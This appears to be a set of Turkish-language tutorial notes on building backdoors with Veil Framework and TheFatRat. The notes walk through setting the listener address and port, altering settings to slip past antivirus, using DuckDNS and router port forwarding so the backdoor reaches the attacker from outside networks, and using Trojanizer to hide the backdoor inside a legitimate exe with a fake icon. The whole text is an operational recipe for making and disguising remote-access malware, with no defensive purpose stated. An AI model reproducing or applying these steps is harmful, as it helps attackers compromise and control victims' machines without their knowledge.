Veil Frameeework:
    Veil Framework'ünü kuruyoruz.
    ->use 1
    ->list
    ->use <payload_number>
    ->set LHOST <kali_ip>
    ->set LPORT <Sık kullanılmayan port seçmeye özen göster.>
    ->set PROCESSORS ve set SLEEP fonksiyonlarını değiştirerek antivirüslere yakalanmamaya çalışıyoruz.
    ->generate (Komutu ile tojanımızı oluşturulmaya başlıyoruz.)
    
TheFatrat Framework:
    TheFatrat Framework'ünü kuruyoruz.
    ->2(Create fud Backdoor 100%)
    ->2(Yavaş ama güçlü mod)
    ->Açılan panelden backdoorun bit değerini, ip adresini, prtunu ve backdoor ismini ayarlıyoruz.
    veya:
    ->6 (Create fud Backdoor 1000%)
    ->İstediğiniz dil ve yöntemi seçin.
    ->Ip ve port değerlerini belirleyin.
    

    
Dış Ağ için Backdoor Oluşturma:
    Öncelikle kulanacağımız portu modemden açıyoruz. 
    İp sabitleme servisi olarak iki seçeneğimiz var.
    1.DuckDNS:
        www.duckdns.org adresinden siteye girelim ve oturum açalım.
        Giriş yaptıktan sonra add domain kısmına gelip subdomain adı belirliyoruz.
        Domainimizi oluşturduktan sonra install menüsünden işletim sistemimizi seçiyoruz.
        Açılan sayfada oluşturduğumuz domain adresini seçiyoruz ve bize kurulum için gerekli komutları veriyor.
        Önce linux gui version yazısına tıklayarak setup dosyasını indiriyoruz.
        ->apt-get install zenity cron curl
        İndirdiğimiz setup dosyasına girerek
        ->chmod +x duck-setup-gui.sh
        ->./duck-setup-gui.sh
        Açılan pencerede oluşturduğumuz domain adını girioruz.
        Token numaramızı siteden öğrendikten sonra onuda giriyoruz.
        Ve kurulum tamamdır.
        
        Dış ağlar için Backdoor oluşturmanın tek farkı LHOST bölümüne kali ipmiz yerine domainimizi giriyoruz ve LPORT bölümünede modemde açtığımız portu girmemiz gerekiyor.
        
        

        
        
Uygulamaların arasına backdoor gizlemek:
    Blackdoorumuzu gerçek bir exe dosyasına fuudlamak için bir araç kurulumu yapacağız.
    ->git clone https://github.com/r00t-3xp10it/trojanizer
    ->cd tojanizer
    ->ls
    ->chmod 777 Tojanizer.sh
    ->./Trojanizer.sh
    Gerekli kurulumlar tamamlandıktan sonra Execute framework uyarısı veecektir burada evet diyeceğiz.
    Bizden fuudlamak istediğimiz backdoor dosyamızı seçmemizi istiyor.
    Backdooru seçitkten sonra LEGIT APPLICATION TO TROJANIZER ekranı gelecek, burada hangi exe dosyasına fuudlamak istiyorsak seçiyoruz.
    Input SFX FILENAME bölümüne oluşturulan backdoorun ismini belirliyoruz.
    ICON REPLACEMENT kısmıda bizden bir icon belirlememizi istiyor. Buradan hazır iconlardan da seçebiliriz yada input your own icon'u seçerek dosyalarımızdan kendi istediğimiz bir icon seçebiliriz.
    
